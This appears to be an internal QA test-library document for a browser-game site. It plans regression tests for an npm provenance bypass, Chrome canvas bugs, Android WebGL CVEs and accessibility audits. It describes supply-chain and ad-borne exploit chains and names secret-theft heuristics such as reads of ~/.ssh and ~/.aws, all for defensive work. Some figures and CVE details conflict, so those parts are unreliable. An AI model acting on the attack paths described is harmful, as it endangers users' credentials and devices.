- [S-114] **[P1]** npm Sigstore provenance BYPASS via compromised maintainer account — 633 malicious npm package versions across 323 unique packages passed cryptographic provenance verification using valid Fulcio-issued signing certificates generated from a stolen GitHub maintainer account (saassentinel.com "Attackers bypass npm's Sigstore provenance, compromise 639 package versions in 48-hour supply chain breach" May 23 2026; ruberli.com "Valid certificates, stolen accounts: how attackers broke npm's last trust signal" May 22 2026; venturebeat.com "npm supply chain: valid certificates, stolen accounts" May 25 2026; endorlabs.com "Mini Shai-Hulud Returns: 600+ Malicious npm Packages Fake Sigstore Badges in antv Ecosystem Attack"; techbuddies.io "Why npm's Last Trust Signal Is Dead" May 25 2026; decryptiondigest.com "sigstore provenance does not prevent supply chain attacks — it makes them detectable") — Between May 18-19 2026, attackers compromised a high-trust npm maintainer's GitHub account and used the stolen OAuth token to drive the maintainer's existing GitHub Actions CI workflow, which was already configured to publish to npm with Sigstore provenance attestation. **Every one of the 633 malicious package versions published during this 48-hour window carried a cryptographically valid Sigstore provenance attestation**, signed by a Fulcio-issued short-lived certificate, with all entries recorded in the public Rekor transparency log. Sigstore worked exactly as designed: it verified the package was built in a CI environment, confirmed a valid certificate was issued, and recorded everything in Rekor. The attestation was **cryptographically real** — the bypass was not a Sigstore protocol flaw but a **maintainer-identity-trust flaw**: Sigstore trusts whatever GitHub Actions identity produces the build, and a stolen GitHub account IS a valid GitHub Actions identity. **This defeats the central assumption underlying S-105 (Phantom Gyp lifecycle bypass), S-107 (Red Hat Miasma trusted-vendor), S-108 (@antv/g-webgpu-engine), S-109 (GitHub npm v12 install-scripts-disabled), S-110 (typosquatting), S-111 (TrapDoor cross-ecosystem), and S-112 (Microsoft dependency-confusion)** — every one of those mitigations assumes that a package with a valid Sigstore provenance attestation is safe to install; S-114 proves that assumption is dead. The mitigation hierarchy now requires (a) maintainer-identity verification OUTSIDE the GitHub-account layer (hardware security keys, passkeys, WebAuthn-only login), (b) behavioral post-install analysis (Socket.dev runtime heuristics, eBPF syscall monitoring) since provenance can no longer be trusted, (c) reproducible-build verification (build the package locally from source and compare the hash to the published artifact — a stolen CI cannot reproduce an attacker's binary), (d) multi-signer policies (require N-of-M maintainers to approve a publish, so a single stolen account cannot ship). **Distinct from S-105/S-107/S-108/S-109/S-110/S-111/S-112** — those are all attack-vector-specific tests (lifecycle-script bypass / trusted-vendor namespace / WebGPU-specific package / install-scripts-disabled-hardening / typosquatting / cross-ecosystem-coordination / dependency-confusion); S-114 is the **SIGNATURE-INFRASTRUCTURE-DEFEAT dimension** that invalidates the cryptographic-trust layer all the others rely on. **Test for GameZipper**: (1) **audit GameZipper's CI/CD for Sigstore provenance dependencies** — `grep -rE "provenance|sigstore|fulcio|rekor" /home/msdn/gamezipper.com/.github/ /home/msdn/gamezipper.com/scripts/ 2>/dev/null`; if any CI step trusts npm provenance attestations as a security gate, downgrade that trust to "informational signal, not security gate"; (2) **install behavioral post-install monitoring** — Socket.dev's runtime heuristic analysis (network connections to non-npm-registry hosts, filesystem reads of ~/.ssh and ~/.aws, environment-variable exfiltration patterns) catches what Sigstore cannot; enable it in pre-commit and CI; (3) **enforce WebAuthn/passkey-only login for all npm publish workflows** — disable password + SMS 2FA for any maintainer account with npm publish rights; GitHub now supports passkey-only login enforcement via organization policy; (4) **enable npm's multi-signer publishing** — for any package with multiple maintainers, require N-of-M approvals before publish; a single stolen account then cannot ship; (5) **subscribe to the endorlabs.com Mini Shai-Hulud IOC feed** — endorlabs maintains the canonical list of packages known to have carried fake-but-valid Sigstore badges in the antv ecosystem attack; cross-reference GameZipper's `package-lock.json` weekly; (6) **the "Sigstore is detectable, not preventive" principle** (decryptiondigest.com) — reframe GameZipper's supply-chain posture: Sigstore attestation is now a DETECTION signal (something to alert on when absent) not a PREVENTION signal (something to trust when present); absent attestation = suspicious; present attestation = neutral, not safe; (7) **audit the May 19 2026 window** — pull GameZipper's CI install logs for May 18-20 2026 and verify no package from the 633-version IOC list was installed; if any was, treat as a credential-exfiltration incident and rotate all CI secrets (GitHub PAT, Cloudflare API token, Monetag credentials) per the incident-response runbook. **Severity justification**: P1 because this invalidates the cryptographic-trust layer that every prior 2026 npm-supply-chain mitigation (S-105 through S-112) relies on — without an alternative trust mechanism, GameZipper has no remaining supply-chain defense that a single stolen GitHub account cannot defeat.

### 32.2 Chrome 150 DevTools drawElementImage Blank-Canvas Visual-Regression-Test Bug
- [S-115] **[P2]** Chrome 150 DevTools Protocol `drawElementImage` returns frozen/blank pixels for any WebGL/WebGPU/2D-canvas content, breaking all CDP-based visual-regression tools (Playwright `toHaveScreenshot()` / `expect(screenshot).toMatch()` / Percy / Chromatic / Applitools) for canvas-heavy games (github.com/WICG/html-in-canvas/issues/120 "Regression with nested canvases · Issue #120"; issues.chromium.org/issues/522845799 "drawElementImage never reflects canvas re-renders: WebGL canvas content"); html-in-canvas.dev documentation; stackoverflow.com/questions/74268915 "How do I inspect HTML canvas using Chrome DevTools") — Chrome 150's implementation of the CDP `Page.captureScreenshot` / `drawElementImage` API has a documented regression where **any page containing a WebGL, WebGPU, or 2D canvas that re-renders via `requestAnimationFrame` or worker-driven draw calls produces a frozen or blank screenshot** when captured via the DevTools Protocol. The bug manifests as: (a) the canvas element renders correctly on screen (the user sees the game playing normally), but (b) the CDP screenshot returns either a blank rectangle or a stale frame from the moment the screenshot was queued; (c) three.js scenes, shader demos, particle systems, chart libraries, and **every GameZipper canvas-based puzzle/arcade/idle game** are affected because they all use the affected canvas-render paths. The downstream consequence for QA: **every visual-regression test that relies on CDP screenshots produces false negatives (the test "passes" because the screenshot matches the baseline — but the baseline was also blank)** or **false positives (the test "fails" because the screenshot is blank and doesn't match the non-blank baseline)**. GitHub issue #120 confirms the regression is in Chrome Canary 150.0.7835.0+ and is tracked in issues.chromium.org/522845799 with the explicit note "This makes drawElementImage unusable as-is for any content containing WebGL, WebGPU, or (under BeginFrame) 2d canvases: three.js scenes, shaders, charts, particle effects — all capture frozen or blank while rendering correctly on screen." **Distinct from C-095** (HTML-in-Canvas API origin trial — tests the RENDERING API itself) and **C-098** (WebGPU "break on error" DevTools option — tests the ERROR-HANDLING API) — S-115 is the **TESTING-TOOL-DEPENDENCY dimension**: GameZipper's visual-regression infrastructure (Playwright `toHaveScreenshot`, Percy, Chromatic, Applitools, the canvas pixel-diff pipeline from G-120) depends on CDP screenshots, and Chrome 150 breaks that dependency. **Distinct from G-120** (canvas pixel-diff CI pipeline — the GameZipper-specific implementation) — G-120 is the pipeline, S-115 is the upstream-tool bug that breaks the pipeline. **Test for GameZipper**: (1) **identify which GameZipper visual-regression tests use CDP screenshots** — `grep -rE "toHaveScreenshot|toMatch\(|percy|chromatic|applitools|captureScreenshot|drawElementImage" /home/msdn/gamezipper.com/test-library/ /home/msdn/gamezipper.com/scripts/ 2>/dev/null`; document every affected test; (2) **on Chrome 150 stable (post-June-30-2026 release), re-baseline every visual-regression test** — capture new baselines and verify they are NOT blank; if baselines come back blank, the bug is hitting GameZipper and the test is producing false-confidence results; (3) **add a "screenshot-not-blank" pre-check** to every visual-regression test — before comparing against a baseline, verify the captured screenshot has >5% non-zero pixels (a blank canvas is almost always 0% non-zero); if the pre-check fails, fail the test with "CDP screenshot bug suspected — do not trust this result" rather than silently passing; (4) **fall back to OS-level screenshot capture** for canvas games — on macOS use `screencapture`, on Linux use `import` (ImageMagick) or `grim` (Wayland), on Windows use `Snipping Tool` automation; OS-level capture reads the composited framebuffer and is not affected by the CDP bug; (5) **track the upstream bug fix** in issues.chromium.org/522845799 — when Chrome ships a fix (expected Chrome 151 or 152), re-enable CDP-based visual regression and remove the OS-level fallback; (6) **for the G-120 canvas pixel-diff pipeline specifically**, add a Chrome-version check: if `navigator.userAgent` indicates Chrome 150.x and the canvas is WebGL/WebGPU/2D, route through the OS-level fallback instead of CDP; (7) **cross-browser verify on Firefox and Safari** — neither is affected by this Chrome-specific CDP bug; use Firefox/Safari visual-regression as the trustworthy baseline during the Chrome 150 window. **Severity justification**: P2 because the bug is tooling-level (affects QA confidence, not the games themselves — games still render correctly to users), but the false-negative risk (tests "pass" on blank screenshots) can mask real regressions for the entire Chrome 150 lifecycle, which is a meaningful QA-coverage gap.

### 32.3 Chrome 150 Final macOS 12 Monterey Release — Chrome 151 July 28 2026 Requires macOS 13 Ventura
- [W-153] **[P2]** Chrome 150 (stable June 30 2026) is the FINAL Chrome version supporting macOS 12 Monterey; Chrome 151 (stable July 28 2026) requires macOS 13 Ventura as the minimum — millions of older Intel and Apple-silicon Macs that cannot upgrade past Monterey will be frozen on Chrome 150 indefinitely without security patches or new web-platform features (9to5google.com "Google Chrome ending support for macOS 'Monterey' in July 2026" Jan 23 2026; support.google.com/chrome/thread/404150391 "Sunsetting support for macOS 12 (Monterey) in mid-2026"; macrumors.com "Google Chrome 150 Will Be Last Version to Support macOS Monterey" Jan 12 2026; forbes.com/sites/zakdoffman "Google's Chrome Decision—Updates Stop For Millions Of Apple Users" Jan 26 2026; appleinsider.com "Google Chrome is ditching support for macOS 12 Monterey, leaving older Macs stranded"; superchargebrowser.com/library/chrome-150-macos-monterey-end-support-2026; macobserver.com) — Google's January 2026 platform-status update confirmed that **Chrome 150 will be the last release to support macOS 12; Chrome 151+ will no longer support macOS 12, which is outside of its support window with Apple**. The affected population: (a) every Intel Mac from before 2017 (MacBook Air/Pro, Mac mini, iMac) that shipped with macOS 12 but whose hardware is not on the macOS 13 Ventura compatibility list — these machines are stuck on Monterey permanently; (b) every Apple-silicon Mac whose owner chose not to upgrade (a non-trivial fraction in enterprise/education deployments with OS-version-pinning policies); (c) Forbes estimated the affected population in the "millions of Apple users" range in their January 2026 coverage. The downstream risk for GameZipper: (1) **long-tail unsupported browser population** — Chrome 150 will receive no security patches after Chrome 151 ships, meaning every Chromium CVE disclosed after July 28 2026 affects the Chrome-150-on-Monterey population indefinitely (synergy with S-113 Mythos AI 100 Chromium zero-days — those bugs will not be patched for this population); (2) **feature-frozen population** — every new WebGPU/CSS/JavaScript feature shipping in Chrome 151+ will not reach this population; GameZipper's progressive-enhancement strategy must assume Chrome 150 is the effective-evergreen baseline for macOS 12 users, not the latest Chrome; (3) **test-matrix divergence** — GameZipper QA currently tests against "latest Chrome"; for the Chrome-150-on-Monterey population, "latest Chrome" means Chrome 150 forever — these are different test targets that will diverge over time as Chrome 151/152/153 ship features Chrome 150 lacks. **Distinct from W-138** (ChromeOS 148 LTS enterprise/school — managed-device channel) and **W-141** (ChromeOS 150 LTC enterprise/school — managed-device channel) — those are ENTERPRISE-MANAGED Chromium variants with their own support windows; W-153 is the CONSUMER macOS version-support sunset that strands unmanaged personal Macs. **Distinct from B-068** (macOS 27 Intel drop WASM compatibility — hardware-architecture dimension) — W-153 is the OS-VERSION dimension. **Test for GameZipper**: (1) **add Chrome 150 on macOS 12 Monterey as a permanent regression-test target** — do NOT auto-upgrade this test device to Chrome 151 when it ships July 28 2026; the Chrome-150-on-Monterey population is now a long-tail supported-by-GameZipper configuration; (2) **document the Chrome-150-on-Monterey population size in GameZipper analytics** — pull macOS 12 + Chrome 150 user-agent share from the gz-analytics endpoint; if it's >2% of Mac traffic, treat as a first-class supported configuration; if <0.5%, document as a known-unsupported long-tail; (3) **verify every new GameZipper feature works on Chrome 150** — WebGPU features (Chrome 113+), CSS Gap Decorations (Chrome 149+), HTML-in-Canvas API (Chrome 150+) all land within the Chrome 150 window, but features shipping in Chrome 151+ (WebGPU Immediates API per issuetracker.google.com/514442574, and later) will NOT work on Chrome 150; gate feature rollout on Chrome-version detection (`navigator.userAgentData.getHighEntropyValues(['fullVersionList'])`); (4) **the security-patch-window-exposure dimension** — for every Chromium CVE disclosed after July 28 2026, document that the Chrome-150-on-Monterey population is exposed indefinitely; extend S-113 Mythos AI zero-day tracking to include this population explicitly; (5) **maintain a Monterey test Mac in the QA lab** — do not recycle or upgrade the Monterey test machine; it is now a permanent fixture of the test matrix for the multi-year tail of Chrome 150 support; (6) **communicate the sunset to GameZipper users** — consider a one-time banner for macOS 12 + Chrome 150 users: "Your macOS version will stop receiving Chrome updates after July 2026; consider upgrading your macOS if your hardware supports it"; (7) **plan the eventual Monterey-end-of-GameZipper-support date** — at some future point (likely 2027-2028), GameZipper will drop macOS 12 support; document the criteria (population <0.1% of traffic, no known-active CVEs in Chrome 150, all major new features require Chrome 151+). **Severity justification**: P2 because the affected population is a shrinking long tail (not the majority of Mac users), but the security-patch-window exposure is indefinite and meaningful for any non-trivial Mac traffic share.

### 32.4 Chrome 150.0.7869.0+ HTML-in-Canvas WebGL/WebGPU BREAKING API CHANGE
- [W-154] **[P2]** Chrome 150.0.7869.0+ ships a BREAKING CHANGE to the HTML-in-Canvas WebGL and WebGPU APIs in response to WICG working-group feedback — migration guide required for any code using `drawElementImage()` with WebGL/WebGPU target contexts (github.com/WICG/html-in-canvas/issues/132 "FYI: breaking change to the html-in-canvas WebGL and WebGPU APIs"; github.com/WICG/html-in-canvas/issues/120 nested-canvases regression; html-in-canvas.dev interactive demos) — A WICG working-group member filed issue #132 as an explicit "FYI: breaking change" notice documenting that the HTML-in-Canvas API surface changed in Chrome 150.0.7869.0+ in response to working-group feedback. The change affects code that calls `CanvasRenderingContext2D.drawElementImage()` with a target canvas context that is WebGL or WebGPU (the most common use case: rendering HTML UI overlays into a WebGL/WebGPU game canvas for accessibility, per C-095). **Any GameZipper code or third-party library that adopted the HTML-in-Canvas API during the Chrome 149 origin-trial window (W-122, C-095) and targets WebGL/WebGPU canvases will break on Chrome 150.0.7869.0+ unless migrated per the published migration guide.** The migration is not optional — the old API shape is removed, not deprecated. **Distinct from W-122** (Chrome I/O 2026 HTML-in-Canvas API origin trial — introduction) and **C-095** (Google I/O 2026 HTML-in-Canvas API accessibility screen-reader — adoption test) — those test the INTRODUCTION of the API; W-154 tests the POST-STABLE BREAKING-CHANGE migration that early adopters must perform. **Distinct from S-115** (Chrome 150 drawElementImage blank-canvas visual-regression bug — a different bug in the same API surface) — S-115 is a SCREENSHOT-BUG, W-154 is an API-SHAPE-CHANGE. **Test for GameZipper**: (1) **audit GameZipper code for HTML-in-Canvas API usage** — `grep -rE "drawElementImage|html-in-canvas|HTMLInCanvas" /home/msdn/gamezipper.com/ --include="*.html" --include="*.js" 2>/dev/null`; if no matches, GameZipper did not adopt the API during the origin trial and W-154 is a no-op (document as "not adopted — no migration needed"); (2) **if matches found, identify the target canvas context** — `drawElementImage(elem)` called on a `CanvasRenderingContext2D` obtained from `canvas.getContext('2d')` where `canvas` is also used for WebGL/WebGPU is the affected pattern; verify the migration-guide-required code path; (3) **follow the migration guide at github.com/WICG/html-in-canvas/issues/132** — the issue body contains the specific before/after code shape; apply the migration before Chrome 150.0.7869.0 reaches GameZipper's user base; (4) **test on Chrome 150.0.7869.0+ after migration** — verify the HTML-in-Canvas overlay renders correctly into the WebGL/WebGPU game canvas; (5) **the origin-trial-to-stable migration risk** — any future Chrome API GameZipper adopts during an origin trial carries the same breaking-change risk; document the origin-trial adoption policy ("adopt for testing only, do not ship to production until stable-channel + 1 minor version"); (6) **subscribe to WICG/html-in-canvas issues** — any future breaking changes will be filed as "FYI: breaking change" issues in this repo; the GameZipper QA cron should grep this repo weekly for new "breaking change" issues. **Severity justification**: P2 because the API was in origin trial (limited adoption) and the breaking change has a published migration guide, but any GameZipper code that adopted it during origin trial will silently break on Chrome 150.0.7869.0+ without migration.

### 32.5 Chrome Android WebGL Security Regression — CVE-2026-9921 + CVE-2026-9880 (pre-148.0.7778.216)
- [B-102] **[P1]** Chrome Android WebGL security-regression pair — CVE-2026-9921 uninitialized-use cross-origin information disclosure + CVE-2026-9880 critical sandbox escape (both pre-148.0.7778.216, fixed in Chrome 148.0.7778.216) (bugzilla.redhat.com/show_bug.cgi?id=2483084 "CVE-2026-9921 chromium-browser — Uninitialized Use in WebGL in Google Chrome on Android prior to 148.0.7778.216 allowed a remote attacker to leak cross-origin information via a crafted HTML page"; cvefeed.io/vuln/detail/CVE-2026-9880 "CVE-2026-9880 — Google Chrome WebGL Sandbox Escape Vulnerability — Insufficient validation of untrusted input in WebGL in Google Chrome prior to 148.0.7778.216 allowed a remote attacker who had compromised the renderer process to potentially perform a sandbox escape via a crafted HTML page — Chromium security severity: Critical"; app.opencve.io/cve/CVE-2026-9876 related CVE-2026-9876 WebGL UAF Android) — Two Android-platform-specific Chrome WebGL vulnerabilities fixed in Chrome 148.0.7778.216 (the same patch train as CVE-2026-9876, B-046's parent advisory) constitute a paired security regression for GameZipper's Android user base: (a) **CVE-2026-9921** — Uninitialized Use in WebGL on Chrome Android allows a remote attacker to **leak cross-origin information** via a crafted HTML page; for GameZipper this means a malicious ad creative (served via Monetag/AdSense programmatic pipeline) could read data from the GameZipper origin (cookies, localStorage game-saves, user identifiers) by exploiting the uninitialized WebGL state; (b) **CVE-2026-9880** — Critical-severity WebGL sandbox escape allows a remote attacker who has already compromised the renderer process (via any renderer bug, including CVE-2026-9921 or a separate exploit) to **escape the Chrome sandbox** and execute code with elevated privileges; for GameZipper this is the worst-case scenario: a malicious ad compromises the renderer (CVE-2026-9921) → escalates to sandbox escape (CVE-2026-9880) → full device compromise of the GameZipper user's Android phone. **The Android-specificity matters**: both CVEs are filed as "in Google Chrome on Android" — the same WebGL code path on Chrome desktop is NOT affected (different ANGLE/GPU backend implementation), which means GameZipper's Android traffic (~70% mobile per G-141) bears the full exposure while desktop traffic does not. **Distinct from B-073** (Chrome 149.0.7827.114 74-CVE batch — version-batch regression) and **B-083** (Chrome ARM64 Linux Q2 2026 platform — different platform) — B-102 is the **ANDROID-PLATFORM + WEBGL-SPECIFIC** dimension: the vulnerability is in the Android WebGL implementation specifically, not the cross-platform WebGL code. **Distinct from B-099** (Android June 2026 Security Bulletin 124 vulns + Framework zero-day — OS-level, not Chrome-level) and **B-067** (Android June 2026 touch/WebAudio regression — functional, not security) — B-102 is the CHROME-ON-ANDROID + WEBGL + SECURITY intersection. **Test for GameZipper**: (1) **update the Android Chrome minimum-supported version to 148.0.7778.216** — any Android Chrome below this version is exposed to a confirmed critical-severity sandbox escape and should be flagged in QA reports; add `navigator.userAgent` detection for Android Chrome < 148.0.7778.216 and consider showing a "please update Chrome" interstitial; (2) **re-verify the Top 30 games on Android Chrome 148.0.7778.216** — confirm no regression from the WebGL fixes (the patch may have tightened WebGL state initialization in ways that break games relying on undefined behavior); (3) **the malicious-ad-creative attack vector** — both CVEs require "a crafted HTML page" to exploit; for GameZipper the most likely vector is a malicious creative served through the Monetag/AdSense programmatic pipeline (synergy with S-054 AI-powered ad fraud, S-058 anti-detect IVT, S-102 Chromium monthly bulletin); extend the ad-creative security audit to verify no creative is exploiting uninitialized WebGL state; (4) **the cross-origin-leak dimension (CVE-2026-9921)** — verify GameZipper's ad iframes are properly sandboxed (sandbox attribute with `allow-same-origin` absent, `allow-scripts` present but no `allow-same-origin`); this prevents a malicious creative from reading GameZipper origin data even if it exploits CVE-2026-9921; (5) **the sandbox-escape dimension (CVE-2026-9880)** — there is no application-level mitigation for a Chrome sandbox escape; the only defense is patching; document the patch-window exposure (time between Chrome 148.0.7778.216 ship date and the user's actual update) and track the Android Chrome version distribution in GameZipper analytics; (6) **the OEM-WebView-lag dimension** — Android's System WebView (used by hybrid game wrappers, Cordova, Capacitor, React Native WebView apps) updates independently of Chrome; verify any GameZipper-distributed Android app wrapper has WebView ≥ the equivalent of Chrome 148.0.7778.216; (7) **subscribe to the Chromium Android-specific CVE feed** — bugzilla.redhat.com and cvefeed.io tag Android-specific CVEs distinctly; the QA cron should add B-series regression tests for each new Android-specific WebGL/WebGPU CVE within 4h of disclosure. **Severity justification**: P1 because CVE-2026-9880 is rated Critical (sandbox escape) and the Android-only specificity means ~70% of GameZipper's mobile traffic bears the full exposure; the exploit chain (renderer compromise → sandbox escape → device takeover) is the worst-case scenario for an ad-supported game portal.

### 32.6 AI-Discovered-CVE Acceleration Concrete QA-Cadence Impact — Daily Test-Intelligence Cycle During Active Disclosure Windows
- [C-102] **[P2]** AI-discovered-CVE acceleration concrete QA-cadence impact — S-113 documented Anthropic Mythos AI found 100 Chromium zero-days in 15 days (June 15 2026); this C-102 test is the METHODOLOGY/CADENCE-RESPONSE dimension: when Mythos-class tools drop 10+ Chromium CVEs in a single day, the GameZipper test library must add regression tests within HOURS, not the traditional week-long CVE-to-test cycle (builds on S-113 — nationalcybersecurity.com "Anthropic mythos finds 100 browser security bugs in June 2026"; hitechies.com "Claude Mythos: The AI That Hacks Every OS"; venturebeat.com April 9 2026 "Mythos detection ceiling"; techcrunch.com May 7 2026 "How Anthropic's Mythos has rewritten Firefox's approach to cybersecurity"; tomshardware.com; singularityhub.com April 10 2026; tech-insider.org "Project Glasswing"; kucoin.com) — S-113 established the FACT that AI-discovered Chromium CVEs now arrive at 100-in-15-days cadence (vs the pre-2026 baseline of weeks between high-impact Chromium CVEs). **C-102 is the METHODOLOGY-RESPONSE test**: does GameZipper's QA process have a documented and exercised "rapid-CVE-response" playbook that can add regression tests within hours of a Mythos-class disclosure batch, or does it rely on the traditional week-long CVE-to-test cycle that is now obsolete? The structural change: pre-2026, a Chromium CVE disclosure → security-team triage → QA team adds regression test → test runs in next CI cycle = ~1 week. Post-Mythos, a 10-CVE disclosure batch arrives at 09:00 → users on the unpatched Chromium version are exposed → GameZipper must (a) verify which CVEs affect canvas/WebGL/WebGPU game code paths, (b) add regression tests for each, (c) ship the tests to CI, (d) run the Top 20 games against the unpatched Chromium to verify exploit resistance, all within ~4 hours. **Distinct from S-113** (the discovery event) and **S-080/S-088** (earlier AI-discovered-CVE-cadence observations) — C-102 is the **METHODOLOGY/PROCESS/PLAYBOOK** test: is the GameZipper QA org structured to respond at Mythos cadence? **Distinct from C-100** (Self-Healing Test Automation hype-vs-reality — tool-evaluation test) and **C-096/C-097** (specific AI-agent tools) — C-102 is the CADENCE-RESPONSE-PROCESS test that those tools must support. **Test for GameZipper**: (1) **write a "Mythos-class rapid-CVE-response" runbook** — a step-by-step playbook that the Dynamic Test Intelligence cron follows when a batch of ≥5 Chromium CVEs drops in a single day: (a) parse the CVE list from the disclosure feed (Anthropic security disclosures, Google Project Zero, Mozilla Mythos-uncovered-bugs feed, CSA coordination channel), (b) for each CVE, classify whether it affects canvas/WebGL/WebGPU/audio/input code paths GameZipper games use, (c) for each game-affecting CVE, add a B-series regression test stub to the master library with the CVE ID and a "verify Top 20 games still render/play" verification step, (d) commit and push the test-library update within 4 hours of disclosure; (2) **exercise the runbook monthly** with a simulated CVE batch (use a historical Chromium CVE set as the test input) — measure end-to-end time from disclosure-simulated to test-library-committed; target <4 hours; if >8 hours, the process is too slow and must be automated further; (3) **upgrade the Dynamic Test Intelligence cron cadence during active Mythos disclosure windows** — when S-113-class disclosure is active (a Mythos or competitor AI publishes a batch of zero-days), the 4-hour cron should switch to a 1-hour cadence for the duration of the window (typically 1-2 weeks post-disclosure while vendors patch); document the trigger condition ("Anthropic security blog post OR Project Zero batch disclosure OR CSA coordination alert") and the auto-cadence-switch logic; (4) **pre-build regression-test templates for the common Chromium-bug patterns** — canvas OOB write, WebGL UAF, WebGPU info disclosure, V8 type confusion, ANGLE uninitialized use, Skia stack overflow, audio UAF, network UAF, UI spoofing — these are the recurring CVE shapes (visible across B-043 through B-102); having a template for each means a new CVE in a known shape can be added as a regression test in minutes, not hours; (5) **the patch-window-exposure metric** — for each Mythos-class disclosure batch, measure and document (a) how many GameZipper users are on the unpatched Chromium version at disclosure time, (b) how long until the Chromium stable-channel patch ships, (c) how long until GameZipper's CI infrastructure updates to the patched Chromium, (d) how long until the median GameZipper user updates; this metric exposes the actual user-exposure window and justifies the cadence investment; (6) **subscribe to the Mythos coordination channel** — Anthropic coordinates Mythos disclosures with vendors under embargo; the CSA (Cloud Security Alliance) runs a coordination channel for downstream consumers; GameZipper QA should subscribe to receive embargoed pre-disclosure notices so the regression tests can be prepared BEFORE public disclosure, not after; (7) **the attacker-side mirror** — Mythos is a defender tool today, but competitors will eventually build attacker-side equivalents; the 20-hour exploit-window SLA from S-057 must be re-evaluated quarterly as attacker-side AI-fuzzing matures; document the projected exploit-development-time trend and update the SLA accordingly. **Severity justification**: P2 because this is a methodology/process test (not a specific vulnerability), but the absence of a rapid-CVE-response process means GameZipper will accumulate untested CVE exposure during every Mythos-class disclosure window, which compounds over time into a meaningful QA-coverage gap.

### 32.7 Cognitive Accessibility Missing from Self-Managed Audits — ADA Title II April 2026 + 27% Lawsuit Surge
- [A-036] **[P1]** Cognitive accessibility missing from self-managed audits — ADA Title II April 2026 compliance deadline + 27% 2026 ADA-lawsuit surge + self-managed WCAG remediation systematically misses the cognitive-accessibility dimension (testparty.ai/blog/what-triggers-ada-website-lawsuit-2026-patterns "What Triggers ADA Website Lawsuits in 2026 (Pattern Analysis)" June 2026; solid-web.com/web-accessibility-developers-guide-2026 "Web Accessibility 2026: 5 Fixes That Cover 80% of ADA Lawsuits"; mantlr.com/blog/accessibility-lawsuit "ADA Website Compliance in 2026: Lawsuits Are Up"; levelaccess.com/blog "Web Accessibility Lawsuits: 2026 Trends"; lawfold.com/ada-website-lawsuit-news; wcagpros.com/wcag-articles/audit-ing-for-all-understanding-digital-accessibility "What is an Accessibility Audit? 23% Lawsuit Surge"; webability.io/blog/wcag-2-2 "WCAG 2.2 Accessibility Standards: Complete 2026 Compliance Guide") — Three converging 2026 data points elevate cognitive accessibility from a nice-to-have to a P1 litigation-risk dimension: (a) **ADA Title II April 2026 compliance deadline passed** — state/local government entities (and their third-party vendors, including game portals serving K-12/library/municipal users) are now in active enforcement; (b) **27% surge in ADA Title III accessibility lawsuits in 2026** (Seyfarth Shaw tracker: 3,117 federal cases in 2025, up from 2,452 in 2024; UsableNet including state courts: 5,000+ in 2025; the 2026 trend continues at +27%); (c) **testparty.ai's June 2026 pattern analysis documents that self-managed remediation (running axe-core or WAVE and fixing the findings) systematically misses cognitive accessibility** — the gaps automated scanners cannot detect include: (i) **instruction clarity** — game tutorials that assume prior genre knowledge ("match-3" jargon without explanation), (ii) **time-pressure relief** — games with countdown timers that have no pause/slow-mode option for users with motor or cognitive disabilities, (iii) **error recovery** — games that punish mistakes harshly (instant game-over, lost progress) without undo or retry-from-checkpoint, (iv) **complex decision flows** — multi-step crafting/upgrade systems whose mental model is not documented in-game, (v) **working-memory load** — games that require remembering 5+ simultaneous objectives without an in-game reminder UI. **solid-web.com's "5 fixes that cover 80% of ADA lawsuits"** confirms the pattern: the 5 highest-impact fixes are (1) keyboard navigation, (2) alt-text, (3) form labels, (4) color contrast, (5) **cognitive-load reduction** — and cognitive-load reduction is the one self-managed audits most often miss because no automated scanner measures it. **Distinct from A-029/A-030** (WCAG 2.2 SC 3.3.7/3.3.9 Accessible Authentication — specific SC tests), **A-031** (WCAG 2.2 designer failure patterns — visual-design audit), **A-034** (23% 2026 ADA-lawsuit surge + Section 508 — regulatory-umbrella), and **A-035** (post-ADA-Title-II enforcement wave) — A-036 is the **COGNITIVE-DIMENSION + SELF-AUDIT-GAP** angle: even a publisher that runs axe-core weekly and fixes every finding can still be sued for cognitive-accessibility failure because the automated tools don't measure it. **Test for GameZipper**: (1) **commission a cognitive-accessibility-specific human audit** of the Top 20 GameZipper games — automated tools (axe-core, WAVE, Lighthouse, the WCAG Auditor MCP from A-033) cover visual/motor/screen-reader dimensions but NOT cognitive; a human auditor (preferably one with cognitive-disability user-testing experience) must evaluate each game for the 5 testparty.ai patterns (instruction clarity, time-pressure relief, error recovery, complex-decision-flow documentation, working-memory load); budget $500-2000 per game for a cognitive-focused audit; (2) **for the time-pressure-relief dimension specifically**, audit every GameZipper game with a countdown timer: does it have (a) a pause button that stops the timer, (b) a "slow mode" or "relaxed mode" option, (c) a "no timer" practice mode? Games missing all three are cognitive-accessibility failures; document and prioritize remediation; (3) **for the error-recovery dimension**, audit every GameZipper game with permadeath or harsh punishment mechanics: does it have (a) an undo button, (b) a retry-from-checkpoint option, (c) a "casual mode" with reduced consequences? Games with instant-game-over-on-any-mistake and no undo are cognitive-accessibility failures; (4) **for the instruction-clarity dimension**, audit the tutorial/onboarding text of every GameZipper game for genre-jargon assumptions — "match 3", "tower defense", "bullet hell", "roguelike" are jargon that assumes prior knowledge; rewrite tutorials to explain the mechanic, not name the genre; (5) **for the working-memory-load dimension**, audit games with 5+ simultaneous objectives — does the game provide an in-game objective tracker/reminder UI? Games that require the player to remember 5+ objectives without UI support are cognitive-accessibility failures; (6) **add a "cognitive accessibility" section to the per-game QA checklist** (extending the A-015 Game Accessibility 2026 checklist) — each new game must pass the cognitive-accessibility audit before publishing; (7) **publish the cognitive-accessibility commitment in the GameZipper accessibility statement** at `/accessibility` — document which games have cognitive-accessibility features (pause, undo, casual mode) and which are known-limitations (some puzzle games cannot remove the timer without breaking the gameplay); this transparency is itself a litigation defense; (8) **monitor the testparty.ai lawsuit-pattern analysis quarterly** — the patterns that trigger ADA suits evolve; the 5 highest-impact fixes from solid-web.com may shift as plaintiffs' firms adapt. **Severity justification**: P1 because (a) cognitive accessibility is the dimension self-managed audits most often miss (so GameZipper is likely currently non-compliant without knowing it), (b) the 27% lawsuit surge means plaintiffs' firms are actively targeting sites with cognitive-accessibility gaps, and (c) a single cognitive-accessibility ADA suit can cost $25-100K + ongoing monitoring per A-035.

### 32.8 Nordcurrent Data-Driven Player Drop-Off Per-Level Retention-Curve Methodology
